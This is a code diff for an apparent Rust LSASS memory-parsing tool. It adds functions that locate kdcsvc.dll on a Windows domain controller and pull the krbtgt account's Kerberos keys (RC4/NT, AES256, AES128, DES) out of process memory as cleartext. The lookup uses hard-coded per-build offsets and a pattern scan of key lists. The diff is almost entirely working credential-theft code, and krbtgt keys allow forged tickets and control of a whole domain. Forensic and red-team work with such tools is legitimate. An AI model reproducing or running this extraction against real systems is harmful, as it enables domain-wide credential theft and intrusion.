@@ -125,6 +125,7 @@ pub struct LsassDlls<'a> {
     pub livessp: Option<&'a LoadedModule>,
     pub cloudap: Option<&'a LoadedModule>,
     pub dpapisrv: Option<&'a LoadedModule>,
+    pub kdcsvc: Option<&'a LoadedModule>,
 }
 
 impl<'a> LsassDlls<'a> {
@@ -138,6 +139,7 @@ impl<'a> LsassDlls<'a> {
             livessp: find_module(modules, "livessp.dll"),
             cloudap: find_module(modules, "cloudap.dll"),
             dpapisrv: find_module(modules, "dpapisrv.dll"),
+            kdcsvc: find_module(modules, "kdcsvc.dll"),
         }
     }
 }
@@ -1205,6 +1207,13 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
         }
     }
 
+    // KDC / krbtgt keys (domain controllers only — no-op when kdcsvc.dll absent).
+    if let Some(kdc) = dlls.kdcsvc {
+        if let Some(krbtgt) = extract_kdc_krbtgt(&lsass_vmem, kdc.base, build_number) {
+            all_creds.insert(KRBTGT_SYNTHETIC_LUID, krbtgt);
+        }
+    }
+
     Ok(finalize_credentials(all_creds))
 }
 
@@ -1981,6 +1990,122 @@ fn scan_phys_for_kerberos_keys<P: PhysicalMemory>(
     );
 
     all_key_groups
+}
+
+/// Synthetic LUID for the domain krbtgt key set (domain-wide, not session-based).
+const KRBTGT_SYNTHETIC_LUID: u64 = 0x6b72_6274_6774_0000; // "krbtgt"
+
+/// `_KDC_TICKET_INFO` global RVA in kdcsvc.dll by build. The struct holds the
+/// krbtgt service name (UNICODE_STRING @+0x00) and credential-list pointers
+/// (@+0x40 current, @+0x48 "newer") to in-memory KERB key lists whose keys are
+/// stored in cleartext (the KDC signs tickets with them — no decryption needed).
+const KDC_TICKET_INFO_RVAS: &[(u32, u64)] = &[(26100, 0xd2588), (17763, 0x7f468)];
+
+/// Extract the krbtgt account's Kerberos keys (RC4/NT, AES256, AES128, DES) from
+/// a DC's kdcsvc. Returns a synthetic "krbtgt" credential, or None (non-DC, or
+/// the build's `_KDC_TICKET_INFO` RVA is unknown — add it to the table).
+fn extract_kdc_krbtgt(vmem: &dyn VirtualMemory, kdc_base: u64, build: u32) -> Option<Credential> {
+    // Try the build's RVA first, then any known RVA as a fallback.
+    let rvas = KDC_TICKET_INFO_RVAS
+        .iter()
+        .filter(|(b, _)| *b == build)
+        .chain(KDC_TICKET_INFO_RVAS.iter())
+        .map(|(_, r)| *r);
+    for rva in rvas {
+        let g = kdc_base + rva;
+        let name_len = vmem.read_virt_u16(g).unwrap_or(0) as usize;
+        let name_ptr = vmem.read_virt_u64(g + 8).unwrap_or(0);
+        if !(2..=64).contains(&name_len) || name_ptr <= 0x10000 {
+            continue;
+        }
+        let name = vmem
+            .read_virt_bytes(name_ptr, name_len)
+            .ok()
+            .map(|b| crate::utils::utf16le_decode(&b))
+            .unwrap_or_default();
+        if !name.eq_ignore_ascii_case("krbtgt") {
+            continue;
+        }
+        let mut keys: Vec<KerberosKey> = Vec::new();
+        let mut realm = String::new();
+        for pc in [
+            vmem.read_virt_u64(g + 0x40).unwrap_or(0),
+            vmem.read_virt_u64(g + 0x48).unwrap_or(0),
+        ] {
+            if pc > 0x10000 {
+                scan_kerb_key_list(vmem, pc, &mut keys, &mut realm);
+            }
+        }
+        if keys.is_empty() {
+            continue;
+        }
+        let mut cred = Credential::new_empty(KRBTGT_SYNTHETIC_LUID, "krbtgt".into(), realm.clone());
+        cred.kerberos = Some(crate::lsass::types::KerberosCredential {
+            username: "krbtgt".into(),
+            domain: realm,
+            password: String::new(),
+            keys,
+            tickets: Vec::new(),
+        });
+        return Some(cred);
+    }
+    None
+}
+
+/// Scan an in-memory KERB key list for key entries. Each entry is
+/// `{count:u32==1, etype:i32, keylen:u32, pad:u32==0, keyptr:u64}` embedded at
+/// irregular offsets; the salt (REALM+"krbtgt") yields the realm. Cleartext keys.
+const fn known_kerb_etype(etype: u32) -> bool {
+    matches!(
+        etype,
+        1 | 3 | 17 | 18 | 23 | 24 | 0xFFFF_FF7B | 0xFFFF_FF80 | 0xFFFF_FF79
+    )
+}
+
+fn scan_kerb_key_list(
+    vmem: &dyn VirtualMemory,
+    struct_ptr: u64,
+    keys: &mut Vec<KerberosKey>,
+    realm: &mut String,
+) {
+    let Ok(buf) = vmem.read_virt_bytes(struct_ptr, 0x400) else {
+        return;
+    };
+    let rd32 = |o: usize| u32::from_le_bytes(buf[o..o + 4].try_into().unwrap());
+    let rd64 = |o: usize| u64::from_le_bytes(buf[o..o + 8].try_into().unwrap());
+    // Salt (@+0x10 len, @+0x18 ptr) → realm = salt without the "krbtgt" suffix.
+    if realm.is_empty() {
+        let salt_len = (rd32(0x10) & 0xffff) as usize;
+        let salt_ptr = rd64(0x18);
+        if (2..=256).contains(&salt_len) && salt_ptr > 0x10000 {
+            if let Ok(sb) = vmem.read_virt_bytes(salt_ptr, salt_len) {
+                let salt = crate::utils::utf16le_decode(&sb);
+                if let Some(idx) = salt.to_lowercase().rfind("krbtgt") {
+                    *realm = salt[..idx].to_string();
+                }
+            }
+        }
+    }
+    // Key entry anchored on the etype field: {etype:u32, keylen:u32, pad:u32==0,
+    // keyptr:u64}. (The preceding u32 is 1 for RC4 but 0 for AES, so key on etype.)
+    let mut off = 0;
+    while off + 0x10 <= buf.len() {
+        let etype = rd32(off);
+        let keylen = rd32(off + 4) as usize;
+        if known_kerb_etype(etype) && matches!(keylen, 8 | 16 | 24 | 32) && rd32(off + 8) == 0 {
+            let keyptr = rd64(off + 0xc);
+            if keyptr > 0x10000 {
+                if let Ok(kb) = vmem.read_virt_bytes(keyptr, keylen) {
+                    if kb.iter().any(|&b| b != 0)
+                        && !keys.iter().any(|k| k.etype == etype && k.key == kb)
+                    {
+                        keys.push(KerberosKey { etype, key: kb });
+                    }
+                }
+            }
+        }
+        off += 4;
+    }
 }
 
 fn find_module<'a>(modules: &'a [LoadedModule], name: &str) -> Option<&'a LoadedModule> {
